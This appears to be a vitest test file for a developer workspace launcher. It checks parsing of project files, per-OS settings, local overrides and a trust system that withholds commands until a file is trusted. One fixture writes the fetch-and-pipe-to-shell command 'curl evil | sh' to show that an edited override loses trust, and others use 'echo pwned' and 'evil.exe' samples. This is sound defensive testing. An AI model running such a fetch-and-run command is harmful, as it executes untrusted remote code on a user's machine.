import { chmod, mkdir, mkdtemp, realpath, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { LOCAL_FILE, PROJECT_FILE, checkProject, findProjectFile, interpret, parseWait, readProjectFile, runsCode } from "./project.js";
import { collectBoltTargets } from "./switch.js";
import { trustProject } from "./trust.js";
import type { OS, TrustState } from "./types.js";

let dir: string;

beforeEach(async () => {
  dir = await realpath(await mkdtemp(join(tmpdir(), "specter-project-")));
  process.env["SPECTER_HOME"] = join(dir, "home");
});

afterEach(async () => {
  delete process.env["SPECTER_HOME"];
  await rm(dir, { recursive: true, force: true });
});

async function project(contents: unknown, at = ".", name = PROJECT_FILE): Promise<string> {
  const root = join(dir, at);
  await mkdir(root, { recursive: true });
  const file = join(root, name);
  await writeFile(file, typeof contents === "string" ? contents : JSON.stringify(contents), "utf8");
  return file;
}

/** Interpret a file's JSON without touching disk. */
function read(main: Record<string, unknown>, options: { os?: OS; trust?: TrustState; local?: Record<string, unknown> } = {}) {
  return interpret(
    { main, ...(options.local ? { local: options.local } : {}) },
    { file: "/work/acme/.specter.json", personal: false, trust: options.trust ?? "untrusted", os: options.os ?? "darwin" },
  );
}

describe("findProjectFile", () => {
  it("walks up until it finds one, the way git looks for .git", async () => {
    const file = await project({ name: "Root" });
    const deep = join(dir, "packages", "core", "src");
    await mkdir(deep, { recursive: true });
    expect(await findProjectFile(deep)).toBe(file);
  });

  it("finds the nearest one when there are several", async () => {
    await project({ name: "Root" });
    const inner = await project({ name: "Api" }, "apps/api");
    expect(await findProjectFile(join(dir, "apps", "api"))).toBe(inner);
  });
});

describe("the simplest file", () => {
  it("is just bolts listing what they open", () => {
    const { workspace, diagnostics } = read({
      bolts: [{ label: "api", targets: [{ folder: "apps/api" }, { url: "http://localhost:3000" }] }],
    });

    expect(diagnostics.filter((entry) => entry.level !== "note")).toEqual([]);
    expect(workspace.name).toBe("acme");
    const steps = collectBoltTargets(workspace, workspace.bolts[0]!);
    expect(steps.map((step) => [step.kind, step.value])).toEqual([
      ["folder", "/work/acme/apps/api"],
      ["link", "http://localhost:3000"],
    ]);
  });

  it("shares one asset between bolts that list the same thing inline", () => {
    const { workspace, diagnostics } = read({
      bolts: [
        { label: "a", targets: [{ folder: "apps/api" }] },
        { label: "b", targets: [{ folder: "apps/api" }] },
      ],
    });
    expect(workspace.folders).toHaveLength(1);
    expect(diagnostics).toEqual([]);
    expect(workspace.bolts[0]!.steps).toEqual(workspace.bolts[1]!.steps);
  });
});

describe("shared assets", () => {
  it("are named by label from bolts, case-insensitively", () => {
    const { workspace } = read({
      links: [{ label: "Staging", url: "staging.acme.com" }],
      folders: ["apps/api"],
      bolts: [{ label: "Deploy", targets: ["staging", "apps/api"] }],
    });
    expect(workspace.bolts[0]!.steps).toEqual([
      { kind: "asset", id: "link:staging" },
      { kind: "asset", id: "folder:apps/api" },
    ]);
  });

  it("says which asset a mistyped label probably meant", () => {
    const { diagnostics } = read({
      links: [{ label: "Staging", url: "staging.acme.com" }],
      bolts: [{ label: "Deploy", targets: ["Stagin"] }],
    });
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", hint: 'Did you mean "Staging"?' }));
  });

  it("accepts the macOS-era bundleIdOrAppName", () => {
    const { workspace } = read({ apps: [{ label: "Slack", bundleIdOrAppName: "com.tinyspeck.slackmacgap" }] });
    expect(workspace.apps[0]!.app).toBe("com.tinyspeck.slackmacgap");
  });
});

describe("per-OS values", () => {
  const file = {
    apps: [{ label: "Editor", app: { macos: "Visual Studio Code", linux: "code" } }],
    bolts: [{ label: "Edit", targets: ["Editor"] }],
  };

  it("picks this OS's value, by the names people say", () => {
    expect(read(file, { os: "darwin" }).workspace.apps[0]!.app).toBe("Visual Studio Code");
    expect(read(file, { os: "linux" }).workspace.apps[0]!.app).toBe("code");
  });

  it("skips an asset declared for other systems, with a note rather than an error", () => {
    const { workspace, diagnostics } = read(file, { os: "win32" });
    expect(workspace.apps).toEqual([]);
    expect(workspace.bolts[0]!.steps).toEqual([]);
    expect(diagnostics.every((entry) => entry.level === "note")).toBe(true);
  });

  it("honours an os list on any entry", () => {
    const main = { bolts: [{ label: "x", targets: [{ folder: "a", os: ["linux", "windows"] }, { folder: "b" }] }] };
    expect(read(main, { os: "darwin" }).workspace.folders.map((folder) => folder.label)).toEqual(["b"]);
    expect(read(main, { os: "win32" }).workspace.folders.map((folder) => folder.label)).toEqual(["a", "b"]);
  });

  it("warns about an OS it does not know", () => {
    const { diagnostics } = read({ apps: [{ app: { macos: "Code", beos: "code" } }] });
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "apps[0].app.beos" }));
  });
});

describe("commands and trust", () => {
  const main = {
    commands: [{ label: "dev", run: "pnpm dev", cwd: "apps/api", env: { PORT: 3000, DEBUG: true }, shell: "sh" }],
    bolts: [{ label: "Run", targets: ["dev"] }],
  };

  it("parses a command fully, env values written as they read", () => {
    const { declaredCommands } = read(main);
    expect(declaredCommands[0]).toEqual({
      id: "command:dev",
      label: "dev",
      run: "pnpm dev",
      cwd: "/work/acme/apps/api",
      env: { PORT: "3000", DEBUG: "true" },
      shell: "sh",
    });
  });

  it("withholds commands until the file is trusted, but keeps them in the bolt", () => {
    const untrusted = read(main);
    expect(untrusted.workspace.commands).toEqual([]);
    expect(untrusted.withheld.map((item) => item.id)).toEqual(["command:dev"]);
    expect(untrusted.workspace.bolts[0]!.steps).toEqual([{ kind: "asset", id: "command:dev" }]);

    const trusted = read(main, { trust: "trusted" });
    expect(trusted.workspace.commands).toHaveLength(1);
    expect(trusted.withheld).toEqual([]);
  });

  it("withholds files that run when opened, and apps given as paths", () => {
    const { workspace, withheld } = read({
      files: ["deploy.command", "setup.exe", "README.md"],
      apps: ["./tools/thing.app", "Slack"],
    });
    expect(workspace.files.map((file) => file.label)).toEqual(["README.md"]);
    expect(workspace.apps.map((app) => app.label)).toEqual(["Slack"]);
    expect(withheld.map((item) => item.label).sort()).toEqual(["./tools/thing.app", "deploy.command", "setup.exe"]);
  });

  it("counts what runs code in one warning", () => {
    const { diagnostics } = read({ files: ["x.sh"], commands: [{ run: "make" }] });
    expect(diagnostics).toContainEqual(
      expect.objectContaining({ at: "trust", message: "1 command and 1 item that would run code when opened declared but will not run" }),
    );
  });
});

describe("runsCode", () => {
  it.each([
    ["file", "deploy.command", true],
    ["file", "tools/install.PS1", true],
    ["file", "README.md", false],
    ["folder", "Thing.app/", true],
    ["folder", "apps/api", false],
    ["app", "Slack", false],
    ["app", "com.tinyspeck.slackmacgap", false],
    ["app", "C:\\tools\\evil.exe", true],
  ] as const)("%s %s → %s", (kind, value, expected) => {
    expect(Boolean(runsCode(kind, value))).toBe(expected);
  });
});

describe("bolts", () => {
  it("parses waits in every form", () => {
    expect(parseWait(5)).toEqual({ seconds: 5 });
    expect(parseWait("2s")).toEqual({ seconds: 2 });
    expect(parseWait("5432")).toEqual({ port: 5432, host: "localhost", timeout: 60 });
    expect(parseWait("db:5432")).toEqual({ port: 5432, host: "db", timeout: 60 });
    expect(parseWait("http://localhost:3000")).toEqual({ url: "http://localhost:3000", timeout: 60 });
    expect(parseWait({ port: 80, timeout: 5 })).toEqual({ port: 80, host: "localhost", timeout: 5 });
    expect(parseWait("soon")).toBeUndefined();
    expect(parseWait(0)).toBeUndefined();
  });

  it("keeps dependencies as steps, and reports one naming a missing bolt", () => {
    const { workspace, diagnostics } = read({
      bolts: [
        { label: "api", targets: [{ bolt: "db" }, { bolt: "cache", workspace: "infra" }] },
        { label: "db", targets: [] },
        { label: "web", targets: [{ bolt: "nope" }] },
      ],
    });
    expect(workspace.bolts[0]!.steps).toEqual([
      { kind: "bolt", bolt: "db" },
      { kind: "bolt", bolt: "cache", workspace: "infra" },
    ]);
    expect(diagnostics).toContainEqual(expect.objectContaining({ message: expect.stringContaining('"nope"') }));
  });

  it("reports bolts that need each other", () => {
    const { diagnostics } = read({
      bolts: [
        { label: "a", targets: [{ bolt: "b" }] },
        { label: "b", targets: [{ bolt: "a" }] },
      ],
    });
    expect(diagnostics.filter((entry) => entry.message.includes("need each other"))).toHaveLength(1);
  });

  it("refuses a second bolt of the same name", () => {
    const { workspace, diagnostics } = read({ bolts: [{ label: "x", targets: [] }, { label: "X", targets: [] }] });
    expect(workspace.bolts).toHaveLength(1);
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", at: "bolts[1].label" }));
  });
});

describe("the local override", () => {
  it("adds to the project's lists, overrides its scalars, and replaces a bolt by name", () => {
    const { workspace, diagnostics } = read(
      {
        name: "Acme",
        links: [{ label: "Repo", url: "github.com/acme" }],
        bolts: [{ label: "api", targets: ["Repo"] }],
      },
      {
        local: {
          name: "Acme (mine)",
          links: [{ label: "My board", url: "linear.app/me" }],
          bolts: [{ label: "api", targets: ["Repo", "My board"] }],
        },
      },
    );
    expect(workspace.name).toBe("Acme (mine)");
    expect(workspace.links.map((link) => link.label)).toEqual(["Repo", "My board"]);
    expect(workspace.bolts).toHaveLength(1);
    expect(workspace.bolts[0]!.steps).toHaveLength(2);
    expect(diagnostics).toEqual([]);
  });

  it("is read from disk beside the project file, and trusted together with it", async () => {
    const file = await project({ commands: [{ label: "dev", run: "pnpm dev" }] });
    await project({ commands: [{ label: "mine", run: "make me" }] }, ".", LOCAL_FILE);

    const before = await readProjectFile(file);
    expect(before.workspace.local).toBe(join(dir, LOCAL_FILE));
    expect(before.declaredCommands.map((command) => command.label)).toEqual(["dev", "mine"]);

    await trustProject(file, before.hash);
    expect((await readProjectFile(file)).workspace.trusted).toBe(true);

    // An edit to the override is an edit to what was trusted.
    await project({ commands: [{ label: "mine", run: "curl evil | sh" }] }, ".", LOCAL_FILE);
    expect((await readProjectFile(file)).trust).toBe("stale");
  });
});

describe("personal workspaces", () => {
  it("are trusted because they are yours, and named after their file", async () => {
    const file = await project({ commands: [{ run: "echo hi" }] }, "home/workspaces", "Morning.specter.json");
    const { workspace } = await readProjectFile(file);
    expect(workspace.personal).toBe(true);
    expect(workspace.trusted).toBe(true);
    expect(workspace.name).toBe("Morning.specter".replace(".specter", ""));
  });

  it("may choose which app opens a folder, where a shared file may not", async () => {
    const file = await project({ folders: [{ label: "api", path: "/x/api", openWith: "com.jetbrains.WebStorm" }] }, "home/workspaces", "Mine.json");
    expect((await readProjectFile(file)).workspace.folders[0]!.openWith).toBe("com.jetbrains.WebStorm");

    const shared = read({ folders: [{ label: "api", path: "api", openWith: "com.jetbrains.WebStorm" }] });
    expect(shared.workspace.folders[0]!.openWith).toBeUndefined();
    expect(shared.diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "folders[0].openWith" }));
  });

  it("cannot be impersonated by a symlink pointing at a project's file", async () => {
    const real = await project({ commands: [{ run: "echo pwned" }] }, "repo");
    await mkdir(join(dir, "home", "workspaces"), { recursive: true });
    const link = join(dir, "home", "workspaces", "sneaky.json");
    await symlink(real, link);

    const { workspace } = await readProjectFile(link);
    expect(workspace.personal).toBe(false);
    expect(workspace.trusted).toBe(false);
    expect(workspace.file).toBe(real);
  });
});

describe("trust", () => {
  it("refuses a grant when the file changed after it was shown", async () => {
    const file = await project({ commands: [{ run: "echo one" }] });
    const shown = await readProjectFile(file);
    await project({ commands: [{ run: "echo two" }] });
    await expect(trustProject(file, shown.hash)).rejects.toThrow(/changed while you were reading/);
  });
});

describe("checkProject", () => {
  it("reports missing paths and machine-specific ones", async () => {
    const file = await project({ folders: ["missing", "~/somewhere"], files: ["README.md"] });
    await writeFile(join(dir, "README.md"), "hi");
    const { diagnostics } = await checkProject(file);

    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "error", at: "folders[0].path" }));
    expect(diagnostics).toContainEqual(expect.objectContaining({ level: "warning", at: "folders[1].path" }));
    expect(diagnostics.some((entry) => entry.at.startsWith("files"))).toBe(false);
  });

  it("does not report a folder declared only for another OS as missing", async () => {
    const file = await project({ folders: [{ path: "nowhere", os: "windows" }] });
    const { diagnostics } = await checkProject(file, { os: "darwin" });
    expect(diagnostics.filter((entry) => entry.level === "error")).toEqual([]);
  });

  it("allows an executable it found only once trusted", async () => {
    await writeFile(join(dir, "go"), "#!/bin/sh\n");
    await chmod(join(dir, "go"), 0o755);
    const file = await project({ files: ["go"] });
    const { workspace } = await readProjectFile(file);
    // No extension, so the parser lets it through; the runner checks the execute bit.
    expect(workspace.files).toHaveLength(1);
    expect(workspace.trusted).toBe(false);
  });
});
